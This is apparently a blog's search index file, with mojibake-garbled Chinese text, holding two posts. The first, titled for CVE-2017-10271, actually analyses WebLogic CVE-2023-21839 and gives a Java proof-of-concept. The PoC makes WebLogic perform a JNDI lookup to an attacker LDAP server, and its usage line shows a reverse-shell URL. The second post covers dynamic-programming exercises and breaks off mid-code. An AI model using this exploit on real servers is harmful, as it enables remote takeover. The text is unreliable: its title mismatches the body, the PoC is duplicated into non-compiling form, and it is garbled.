<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ã€CVEå¤ç°ã€‘WebLogic XMLDecoderååºåˆ—åŒ–æ¼æ´(CVE-2017-10271)æ¼æ´å¤ç°</title>
      <link href="/2025/03/24/WebSecurity/cve/weblogiccve/"/>
      <url>/2025/03/24/WebSecurity/cve/weblogiccve/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><p>WebLogic å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2023-21839&#x2F;CNVD-2023-04389ï¼‰ï¼Œç”±äºWeblogic IIOP&#x2F;T3åè®®å­˜åœ¨ç¼ºé™·ï¼Œå½“IIOP&#x2F;T3åè®®å¼€å¯æ—¶ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…é€šè¿‡IIOP&#x2F;T3åè®®ç½‘ç»œè®¿é—®æ”»å‡»å­˜åœ¨å®‰å…¨é£é™©çš„WebLogic Serverï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸWebLogic Serverå¯èƒ½è¢«æ”»å‡»è€…æ¥ç®¡æ‰§è¡Œä»»æ„å‘½ä»¤å¯¼è‡´æœåŠ¡å™¨æ²¦é™·æˆ–è€…é€ æˆä¸¥é‡çš„æ•æ„Ÿæ•°æ®æ³„éœ²ã€‚</p><p>ç”±äºWeblogic t3&#x2F;iiopåè®®æ”¯æŒè¿œç¨‹ç»‘å®šå¯¹è±¡bindåˆ°æœåŠ¡ç«¯ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡lookupæŸ¥çœ‹ï¼Œå½“è¿œç¨‹å¯¹è±¡ç»§æ‰¿è‡ªOpaqueReferenceæ—¶ï¼ŒlookupæŸ¥çœ‹è¿œç¨‹å¯¹è±¡ï¼ŒæœåŠ¡ç«¯ä¼šè°ƒç”¨è¿œç¨‹å¯¹è±¡getReferentæ–¹æ³•ã€‚weblogic.deployment.jms.ForeignOpaqueReferenceç»§æ‰¿è‡ªOpaqueReferenceå¹¶ä¸”å®ç°äº†getReferentæ–¹æ³•ï¼Œå¹¶ä¸”å­˜åœ¨retVal &#x3D; context.lookup(this.remoteJNDIName)å®ç°ï¼Œæ•…å¯ä»¥é€šè¿‡rmi&#x2F;ldapè¿œç¨‹åè®®è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p><p>æˆ‘ä»¬æŒ‰è°ƒç”¨é“¾é¡ºåºæ¥è§£æï¼š</p><hr><h3 id="ğŸ”¹-Step-1ï¼šæ ¸å¿ƒç±»ç»“æ„"><a href="#ğŸ”¹-Step-1ï¼šæ ¸å¿ƒç±»ç»“æ„" class="headerlink" title="ğŸ”¹ Step 1ï¼šæ ¸å¿ƒç±»ç»“æ„"></a>ğŸ”¹ Step 1ï¼šæ ¸å¿ƒç±»ç»“æ„</h3><h4 id="ğŸ§±-OpaqueReference-æ¥å£"><a href="#ğŸ§±-OpaqueReference-æ¥å£" class="headerlink" title="ğŸ§± OpaqueReference æ¥å£"></a>ğŸ§± <code>OpaqueReference</code> æ¥å£</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OpaqueReference</span> &#123;</span><br><span class="line">    Object <span class="title function_">getReferent</span><span class="params">(Name var1, Context var2)</span> <span class="keyword">throws</span> NamingException;</span><br><span class="line">    String <span class="title function_">toString</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>WebLogic ä¸­å®šä¹‰çš„æ¥å£ï¼Œç”¨äºè¡¨ç¤ºä¸€ç§â€œå¯å¼•ç”¨çš„è¿œç¨‹èµ„æºâ€ã€‚</li></ul><h4 id="ğŸ§±-ForeignOpaqueReference-ç±»"><a href="#ğŸ§±-ForeignOpaqueReference-ç±»" class="headerlink" title="ğŸ§± ForeignOpaqueReference ç±»"></a>ğŸ§± <code>ForeignOpaqueReference</code> ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForeignOpaqueReference</span> <span class="keyword">implements</span> <span class="title class_">OpaqueReference</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> Hashtable jndiEnvironment;</span><br><span class="line">    <span class="keyword">private</span> String remoteJNDIName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ForeignOpaqueReference</span><span class="params">(String remoteJNDIName, Hashtable env)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.remoteJNDIName = remoteJNDIName;</span><br><span class="line">        <span class="built_in">this</span>.jndiEnvironment = env;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getReferent</span><span class="params">(Name name, Context ctx)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        InitialContext context;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.jndiEnvironment == <span class="literal">null</span>) &#123;</span><br><span class="line">            context = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            context = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(<span class="built_in">this</span>.jndiEnvironment);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">retVal</span> <span class="operator">=</span> context.lookup(<span class="built_in">this</span>.remoteJNDIName);  <span class="comment">// ğŸš¨ æ¼æ´è§¦å‘ç‚¹</span></span><br><span class="line">        context.close();</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>è¿™é‡Œå°±æ˜¯å…³é”®ç‚¹ï¼š<code>getReferent()</code> æ–¹æ³•ä¼šç›´æ¥ä½¿ç”¨ remoteJNDIName å‘èµ·è¿œç¨‹æŸ¥è¯¢</strong>ï¼Œè€Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™ä¸ªåœ°å€ï¼</p></blockquote><hr><h3 id="ğŸ”¹-Step-2ï¼šå¦‚ä½•è°ƒç”¨-getReferent-ï¼Ÿ"><a href="#ğŸ”¹-Step-2ï¼šå¦‚ä½•è°ƒç”¨-getReferent-ï¼Ÿ" class="headerlink" title="ğŸ”¹ Step 2ï¼šå¦‚ä½•è°ƒç”¨ getReferent()ï¼Ÿ"></a>ğŸ”¹ Step 2ï¼šå¦‚ä½•è°ƒç”¨ <code>getReferent()</code>ï¼Ÿ</h3><p>è°ƒç”¨å‘ç”Ÿåœ¨ WebLogic çš„ <code>WLNamingManager</code> ç±»ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">WLNamingManager</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object boundObject, Name name, Context ctx, Hashtable env)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (boundObject <span class="keyword">instanceof</span> OpaqueReference) &#123;</span><br><span class="line">            boundObject = ((OpaqueReference)boundObject).getReferent(name, ctx); <span class="comment">// â˜£ï¸ è§¦å‘ç‚¹</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦ä¼ å…¥çš„å¯¹è±¡å®ç°äº† <code>OpaqueReference</code> æ¥å£ï¼ŒWebLogic å°±ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒçš„ <code>getReferent()</code> æ–¹æ³• â€”â€” è€Œè¿™åœ¨å†…éƒ¨æ˜¯<strong>å®Œå…¨è‡ªåŠ¨å‘ç”Ÿçš„</strong>ï¼Œä¸éœ€è¦æ”»å‡»è€…æ‰‹åŠ¨è§¦å‘ã€‚</p><hr><p>ğŸ§ª åˆ©ç”¨åŸç†</p><p>æ”»å‡»è€…å¯ä»¥ï¼š</p><ol><li><p><strong>æ„é€ ä¸€ä¸ª <code>ForeignOpaqueReference</code> å®ä¾‹</strong>ï¼Œå…¶å†…éƒ¨ï¼š</p><ul><li><code>remoteJNDIName</code> è®¾ç½®ä¸ºä¸€ä¸ªæ”»å‡»è€…æ§åˆ¶çš„ LDAP&#x2F;RMI åœ°å€</li><li><code>jndiEnvironment</code> æŒ‡å®šäº†ä½¿ç”¨ä»€ä¹ˆ JNDI å·¥å‚ï¼ˆå¦‚ <code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>ï¼‰</li></ul></li><li><p><strong>å°†è¿™ä¸ªå¯¹è±¡é€šè¿‡ <code>bind()</code> æ–¹æ³•ç»‘å®šåˆ° WebLogic çš„ JNDI æœåŠ¡ä¸­</strong></p></li><li><p><strong>è°ƒç”¨ <code>lookup()</code> è·å–è¯¥å¯¹è±¡æ—¶ï¼ŒWebLogic ä¼šè‡ªåŠ¨è°ƒç”¨ <code>getObjectInstance()</code> â†’ <code>getReferent()</code></strong></p></li><li><p><strong><code>getReferent()</code> æ–¹æ³•å†…éƒ¨æ‰§è¡Œè¿œç¨‹ JNDI æŸ¥è¯¢</strong>ï¼Œè§¦å‘ WebLogic å»æ”»å‡»è€…çš„æœåŠ¡å™¨åŠ è½½æ¶æ„ç±»æˆ–ååºåˆ—åŒ–å¯¹è±¡</p></li><li><p>ğŸ’¥ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æˆåŠŸ</strong></p></li></ol><hr><p>ğŸ“Œ å…³é”®ç‚¹åˆ†æ</p><table><thead><tr><th>ä½ç½®</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>ForeignOpaqueReference</code></td><td>è¿™æ˜¯å®ç° <code>OpaqueReference</code> çš„ç±»ï¼Œå…è®¸æ„é€ å¸¦ JNDI çš„è¿œç¨‹å¼•ç”¨</td></tr><tr><td><code>getReferent()</code></td><td>æ¼æ´æ–¹æ³•ï¼Œè‡ªåŠ¨å‘èµ·è¿œç¨‹ lookup</td></tr><tr><td><code>jndiEnvironment</code></td><td>å¯ä»¥æŒ‡å®šåŠ è½½æ–¹å¼ï¼Œå¦‚ RMI æˆ– LDAP</td></tr><tr><td><code>remoteJNDIName</code></td><td>æ”»å‡»è€…æ§åˆ¶çš„è¿œç¨‹åœ°å€</td></tr><tr><td><code>WLNamingManager.getObjectInstance()</code></td><td>åœ¨ JNDI lookup ä¸­ä¼šè‡ªåŠ¨è§¦å‘ <code>getReferent()</code></td></tr><tr><td><code>context.lookup()</code></td><td>å‘èµ·è¿œç¨‹è®¿é—®ï¼ŒåŠ è½½æ¶æ„å¯¹è±¡ï¼Œæœ€ç»ˆæ‰§è¡Œæ”»å‡»è€…ä»£ç </td></tr></tbody></table><hr><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2023_21839</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> String JNDI_FACTORY=<span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> String HOW_TO_USE=<span class="string">&quot;[*]java -jar ç›®æ ‡ip:ç«¯å£ ldapåœ°å€\ne.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span><span class="keyword">throws</span> NamingException</span><br><span class="line">&#123;</span><br><span class="line">    Hashtable&lt;String,String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">    env.put(Context.PROVIDER_URL, url);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span>(args.length &lt;<span class="number">2</span>)&#123;</span><br><span class="line">        System.out.println(HOW_TO_USE);</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">t3Url</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">    <span class="type">String</span> <span class="variable">ldapUrl</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">    InitialContext c=getInitialContext(<span class="string">&quot;t3://&quot;</span>+t3Url);</span><br><span class="line">    Hashtable&lt;String,String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">    weblogic.deployment.jms.ForeignOpaqueReference f=<span class="keyword">new</span> <span class="title class_">weblogic</span>.deployment.jms.ForeignOpaqueReference();</span><br><span class="line">    Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">    jndiEnvironment.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    jndiEnvironment.set(f,env);</span><br><span class="line">    Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;remoteJNDIName&quot;</span>);</span><br><span class="line">    remoteJNDIName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    remoteJNDIName.set(f,ldapUrl);</span><br><span class="line">    <span class="type">String</span> <span class="variable">bindName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis()).nextLong()+<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        c.bind(bindName,f);</span><br><span class="line">        c.lookup(bindName);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span><span class="keyword">throws</span> NamingException</span><br><span class="line">&#123;</span><br><span class="line">    Hashtable&lt;String,String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">    env.put(Context.PROVIDER_URL, url);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span>(args.length &lt;<span class="number">2</span>)&#123;</span><br><span class="line">        System.out.println(HOW_TO_USE);</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">t3Url</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">    <span class="type">String</span> <span class="variable">ldapUrl</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">    InitialContext c=getInitialContext(<span class="string">&quot;t3://&quot;</span>+t3Url);</span><br><span class="line">    Hashtable&lt;String,String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">    weblogic.deployment.jms.ForeignOpaqueReference f=<span class="keyword">new</span> <span class="title class_">weblogic</span>.deployment.jms.ForeignOpaqueReference();</span><br><span class="line">    Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">    jndiEnvironment.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    jndiEnvironment.set(f,env);</span><br><span class="line">    Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;remoteJNDIName&quot;</span>);</span><br><span class="line">    remoteJNDIName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    remoteJNDIName.set(f,ldapUrl);</span><br><span class="line">    <span class="type">String</span> <span class="variable">bindName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis()).nextLong()+<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        c.bind(bindName,f);</span><br><span class="line">        c.lookup(bindName);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> WebLogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘åŠ¨æ€è§„åˆ’</title>
      <link href="/2025/03/19/algorithm/dpalgorithm/"/>
      <url>/2025/03/19/algorithm/dpalgorithm/</url>
      
        <content type="html"><![CDATA[<p>åŠ¨è§„äº”æ­¥æ›²</p><ol><li>ç¡®å®šdpæ•°ç»„ä»¥åŠä¸‹æ ‡çš„å«ä¹‰</li><li>ç¡®å®šé€’æ¨å…¬å¼</li><li>dpæ•°ç»„å¦‚ä½•åˆå§‹åŒ–</li><li>ç¡®å®šéå†é¡ºåº</li><li>ä¸¾ä¾‹æ¨å¯¼dpæ•°ç»„</li></ol><h2 id="63-ä¸åŒè·¯å¾„-II"><a href="#63-ä¸åŒè·¯å¾„-II" class="headerlink" title="63. ä¸åŒè·¯å¾„ II"></a>63. ä¸åŒè·¯å¾„ II</h2><p>ç»™å®šä¸€ä¸ª m x n çš„æ•´æ•°æ•°ç»„ gridã€‚ä¸€ä¸ªæœºå™¨äººåˆå§‹ä½äº å·¦ä¸Šè§’ï¼ˆå³ grid[0][0]ï¼‰ã€‚æœºå™¨äººå°è¯•ç§»åŠ¨åˆ° å³ä¸‹è§’ï¼ˆå³ grid[m - 1][n - 1]ï¼‰ã€‚æœºå™¨äººæ¯æ¬¡åªèƒ½å‘ä¸‹æˆ–è€…å‘å³ç§»åŠ¨ä¸€æ­¥ã€‚<br>ç½‘æ ¼ä¸­çš„éšœç¢ç‰©å’Œç©ºä½ç½®åˆ†åˆ«ç”¨ 1 å’Œ 0 æ¥è¡¨ç¤ºã€‚æœºå™¨äººçš„ç§»åŠ¨è·¯å¾„ä¸­ä¸èƒ½åŒ…å« ä»»ä½• æœ‰éšœç¢ç‰©çš„æ–¹æ ¼ã€‚<br>è¿”å›æœºå™¨äººèƒ½å¤Ÿåˆ°è¾¾å³ä¸‹è§’çš„ä¸åŒè·¯å¾„æ•°é‡ã€‚<br>æµ‹è¯•ç”¨ä¾‹ä¿è¯ç­”æ¡ˆå°äºç­‰äº 2 * 109ã€‚</p><ol><li>ç¡®å®šdpæ•°ç»„ï¼ˆdp tableï¼‰ä»¥åŠä¸‹æ ‡çš„å«ä¹‰ï¼šdp[i][j] ï¼šè¡¨ç¤ºä»ï¼ˆ0 ï¼Œ0ï¼‰å‡ºå‘ï¼Œåˆ°(i, j) æœ‰dp[i][j]æ¡ä¸åŒçš„è·¯å¾„ã€‚</li><li>ç¡®å®šé€’æ¨å…¬å¼ï¼šé€’æ¨å…¬å¼å’Œ62.ä¸åŒè·¯å¾„ä¸€æ ·ï¼Œdp[i][j] &#x3D; dp[i - 1][j] + dp[i][j - 1]ã€‚ä½†è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œå› ä¸ºæœ‰äº†éšœç¢ï¼Œ(i, j)å¦‚æœå°±æ˜¯éšœç¢çš„è¯åº”è¯¥å°±ä¿æŒåˆå§‹çŠ¶æ€ï¼ˆåˆå§‹çŠ¶æ€ä¸º0ï¼‰ã€‚</li><li>dpæ•°ç»„å¦‚ä½•åˆå§‹åŒ–ï¼šå› ä¸ºä»(0, 0)çš„ä½ç½®åˆ°(i, 0)çš„è·¯å¾„åªæœ‰ä¸€æ¡ï¼Œæ‰€ä»¥dp[i][0]ä¸€å®šä¸º1ï¼Œdp[0][j]ä¹ŸåŒç†ã€‚ä½†å¦‚æœ(i, 0) è¿™æ¡è¾¹æœ‰äº†éšœç¢ä¹‹åï¼Œéšœç¢ä¹‹åï¼ˆåŒ…æ‹¬éšœç¢ï¼‰éƒ½æ˜¯èµ°ä¸åˆ°çš„ä½ç½®äº†ï¼Œæ‰€ä»¥éšœç¢ä¹‹åçš„dp[i][0]åº”è¯¥è¿˜æ˜¯åˆå§‹å€¼0ã€‚</li><li>å› ä¸ºä»(0, 0)çš„ä½ç½®åˆ°(i, 0)çš„è·¯å¾„åªæœ‰ä¸€æ¡ï¼Œæ‰€ä»¥dp[i][0]ä¸€å®šä¸º1ï¼Œdp[0][j]ä¹ŸåŒç†ã€‚ä½†å¦‚æœ(i, 0) è¿™æ¡è¾¹æœ‰äº†éšœç¢ä¹‹åï¼Œéšœç¢ä¹‹åï¼ˆåŒ…æ‹¬éšœç¢ï¼‰éƒ½æ˜¯èµ°ä¸åˆ°çš„ä½ç½®äº†ï¼Œæ‰€ä»¥éšœç¢ä¹‹åçš„dp[i][0]åº”è¯¥è¿˜æ˜¯åˆå§‹å€¼0ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">uniquePathsWithObstacles</span>(<span class="params">self, obstacleGrid: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        m = <span class="built_in">len</span>(obstacleGrid)</span><br><span class="line">        n = <span class="built_in">len</span>(obstacleGrid[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> obstacleGrid[m-<span class="number">1</span>][n-<span class="number">1</span>] == <span class="number">1</span> <span class="keyword">or</span> obstacleGrid[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        dp = [[<span class="number">0</span>] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">if</span> obstacleGrid[i][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">                dp[i][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> obstacleGrid[<span class="number">0</span>][j] == <span class="number">0</span>:</span><br><span class="line">                dp[<span class="number">0</span>][j] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">                <span class="keyword">if</span> obstacleGrid[i][j] == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                dp[i][j] = dp[i-<span class="number">1</span>][j]+dp[i][j-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[m-<span class="number">1</span>][n-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><h2 id="343-æ•´æ•°æ‹†åˆ†"><a href="#343-æ•´æ•°æ‹†åˆ†" class="headerlink" title="343. æ•´æ•°æ‹†åˆ†"></a>343. æ•´æ•°æ‹†åˆ†</h2><p>ç»™å®šä¸€ä¸ªæ­£æ•´æ•° n ï¼Œå°†å…¶æ‹†åˆ†ä¸º k ä¸ª æ­£æ•´æ•° çš„å’Œï¼ˆ k &gt;&#x3D; 2 ï¼‰ï¼Œå¹¶ä½¿è¿™äº›æ•´æ•°çš„ä¹˜ç§¯æœ€å¤§åŒ–ã€‚<br>è¿”å› ä½ å¯ä»¥è·å¾—çš„æœ€å¤§ä¹˜ç§¯ ã€‚</p><p>è¾“å…¥: n &#x3D; 2<br>è¾“å‡º: 1<br>è§£é‡Š: 2 &#x3D; 1 + 1, 1 Ã— 1 &#x3D; 1ã€‚</p><p>è¾“å…¥: n &#x3D; 10<br>è¾“å‡º: 36<br>è§£é‡Š: 10 &#x3D; 3 + 3 + 4, 3 Ã— 3 Ã— 4 &#x3D; 36ã€‚</p><p>dp[i] &#x3D; max(dp[i], max((i - j) * j, dp[i - j] * j));<br>æ›´ä¼˜åŒ–ä¸€æ­¥ï¼Œå¯ä»¥è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 